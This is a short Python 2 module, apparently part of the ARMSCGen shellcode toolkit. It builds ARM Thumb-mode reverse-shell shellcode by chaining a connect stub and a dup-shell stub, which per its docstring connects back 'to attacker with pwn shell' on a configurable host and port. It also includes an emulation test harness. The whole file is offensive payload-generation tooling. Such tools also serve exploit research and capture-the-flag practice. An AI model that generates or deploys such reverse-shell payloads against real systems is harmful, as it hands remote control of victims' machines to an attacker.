# connection back

from socket import htons, inet_aton, gethostbyname
from struct import unpack

import connect
import dupsh


def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337, sock='r6'):
    """connection back to attacker with pwn shell on specific port in Thumb Mode

    argument:
        host (str)    : specific IP address or hostname
        port (int/str): specific port
        sock (int/str): sock descriptor for dupsh()
    """
    sc =  connect.generate(host, port)
    sc += dupsh.generate(sock)

    return sc    

def testcase(host='127.0.0.1', port=31337, sock='r6'):
    import ARMSCGen as scgen
    scgen.prepareCompiler('THUMB')
    sc = scgen.CompileSC(generate(host, port, sock), isThumb=True)
    sclen = len(sc)
    print "[+] Registers information"
    scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)

if __name__ == '__main__':
    print generate()
